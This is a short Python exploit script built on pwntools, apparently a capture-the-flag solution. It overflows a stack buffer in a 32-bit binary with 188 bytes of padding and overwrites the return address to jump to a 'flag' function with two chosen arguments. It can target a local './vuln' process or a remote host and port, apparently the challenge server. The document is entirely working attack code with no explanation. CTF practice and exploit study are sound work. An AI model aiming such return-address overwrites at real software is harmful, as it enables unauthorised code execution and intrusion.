from pwn import *
from sys import argv

context.log_level = 'DEBUG'
if 'remote' in argv:
    DEBUG = 0
    p = remote('165.232.101.10', 30733)

else:
    DEBUG = 1
    context.binary = binary = ELF('./vuln')
    p = process(binary.path)

OFFSET = 188
WIN = binary.symbols['flag'] if DEBUG else 0x080491e2
arg1 = 0xdeadbeef
arg2 = 0xc0ded00d

payload = b''
payload += b'A' * OFFSET
payload += p32(WIN)
payload += b'B' * 4  # padding 32 bit
payload += p32(arg1)
payload += p32(arg2)

p.recv()
p.sendline(payload)
p.recv()
if not DEBUG:
    p.recv()
